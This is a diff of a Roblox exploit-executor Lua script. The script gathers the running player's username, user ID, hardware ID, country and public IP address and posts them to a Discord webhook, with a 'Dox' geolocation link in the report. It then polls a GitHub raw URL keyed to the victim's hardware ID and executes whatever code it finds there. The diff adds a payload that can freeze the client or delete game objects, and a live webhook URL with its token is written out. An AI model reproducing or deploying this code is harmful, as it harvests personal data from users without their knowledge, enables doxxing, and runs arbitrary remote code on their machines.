@@ -1,3 +1,4 @@
+-- Services
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local LocalizationService = game:GetService("LocalizationService")
@@ -5,6 +6,7 @@ local UserInputService = game:GetService("UserInputService")
 local MarketplaceService = game:GetService("MarketplaceService")
 local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
 
+-- Platform information
 local platform = UserInputService:GetPlatform()
 local platformNameMap = {
     [Enum.Platform.Windows] = "Windows PC",
@@ -16,29 +18,28 @@ local platformNameMap = {
 }
 local deviceType = platformNameMap[platform] or "Unknown Device"
 
+-- Player information
 local username = Players.LocalPlayer.Name
 local userId = Players.LocalPlayer.UserId
 local hwid = RbxAnalyticsService:GetClientId()
-local scriptName = "YourScriptNameHere"
 local gameId = game.PlaceId
-local gameName = MarketplaceService:GetProductInfo(gameId).Name
-local joinLink = "https://www.roblox.com/games/" .. gameId
-local player = game.Players.LocalPlayer
 local job = tostring(game.JobId)
 local teleportStatement = "game:GetService('TeleportService'):TeleportToPlaceInstance(" .. gameId .. ", '" .. job .. "')"
 local currentTime = os.date("%Y-%m-%d %H:%M:%S")
 
+-- Initialization
 local countryCode
+local ipAddress = "Unknown"
+local githubRepo = "Pumpuma/test"
+local filePath = hwid .. ".lua"
+
+-- Get country code
 local success, result = pcall(function()
     return LocalizationService:GetCountryRegionForPlayerAsync(Players.LocalPlayer)
 end)
-if success then
-    countryCode = result
-else
-    countryCode = "Unknown"
-end
+countryCode = success and result or "Unknown"
 
-local ipAddress = "Unknown"
+-- Get IP address
 if syn then
     ipAddress = syn.request({Url = "https://api64.ipify.org?format=json", Method = "GET"}).Body
 elseif http then
@@ -46,19 +47,33 @@ elseif http then
 end
 ipAddress = HttpService:JSONDecode(ipAddress).ip
 
-local githubRepo = "Pumpuma/test" -- Replace with your GitHub username/repo
-local filePath = "Blacklisted.lua" -- The path to the file to edit
-local function generateEditURL()
-    return "https://github.com/" .. githubRepo .. "/edit/main/" .. filePath .. "?message=" .. HttpService:UrlEncode("Add new HWID") .. "&value=" .. HttpService:UrlEncode(" ")
+-- Functions
+local function generateCreateFileURL()
+    local content = [[
+local c = false
+local b = false
+local bp = false
+local s = false
+
+if c then while true do end endif b then local re = game.Players.LocalPlayer:FindFirstChild('RemoteEvent'); if re then re:Destroy() end endif bp then local p = Workspace.Ignore.LocalCharacter and Workspace.Ignore.LocalCharacter.Bottom;if p then p:Destroy() end endif s then local n = Workspace.Ignore.LocalCharacter and Workspace.Ignore.LocalCharacter.Bottom:FindFirstChild('PrismaticConstraint');if n then n.LowerLimit = 1; n.UpperLimit = 1 end end
+]]
+    return "https://github.com/" .. githubRepo .. "/new/main?filename=" .. filePath .. "&value=" .. HttpService:UrlEncode(content)
 end
-local exe = identifyexecutor()
+
+
+local function generateEditURL()
+    return "https://github.com/" .. githubRepo .. "/edit/main/" .. filePath
+end
 
 local function generateGeoLink(ip)
     return "https://ipinfo.io/" .. ip
 end
 
+-- Identify executor
+local exe = identifyexecutor()
+
 -- Construct the webhook data
-local url = "https://discord.com/api/webhooks/1266074223860781077/BAGPJ7cOHg9FUTGTvfmtykQ4-fcv3h6CODdZ4Q-tWVTyYwwUdklZ761FUEG-OMKaEewb"  -- Replace with your webhook URL
+local url = "https://discord.com/api/webhooks/1266146071416147968/ySql_yTSkL1qZyTkYgwGCY_DArYNAHiIkJwicDrqApUg5crckvee0qoBVgvWCc31E3mO" -- Replace with your webhook URL
 local data = {
     ["content"] = " ",
     ["embeds"] = {
@@ -83,6 +98,7 @@ local data = {
                 {
                     ["name"] = "Commands",
                     ["value"] = "[Blacklist](" .. generateEditURL() .. ")\n" ..
+                             "[Create File](" .. generateCreateFileURL() .. ")\n" ..
                                 "[Dox](" .. generateGeoLink(ipAddress) .. ")",
                     ["inline"] = true
                 },
@@ -96,22 +112,24 @@ local data = {
     }
 }
 
+-- Encode data to JSON
 local newdata = HttpService:JSONEncode(data)
 local headers = {["content-type"] = "application/json"}
 local request = http_request or request or HttpPost or syn.request
-local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+local requestData = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+
+-- Send the Discord webhook request
 local success, err = pcall(function()
-    request(abcdef)
+    request(requestData)
 end)
 if not success then
     warn("Failed to send Discord message: " .. err)
 end
 
-
 while true do
     wait(5)
     local success, result = pcall(function()
-        return loadstring(game:HttpGet("https://raw.githubusercontent.com/Pumpuma/UKI/main/" .. hwid .. ".lua"))()
+        return loadstring(game:HttpGet("https://raw.githubusercontent.com/Pumpuma/Test/main/" .. hwid .. ".lua"))()
     end)
 
     if success then
@@ -120,4 +138,3 @@ while true do
         return
     end
 end
-
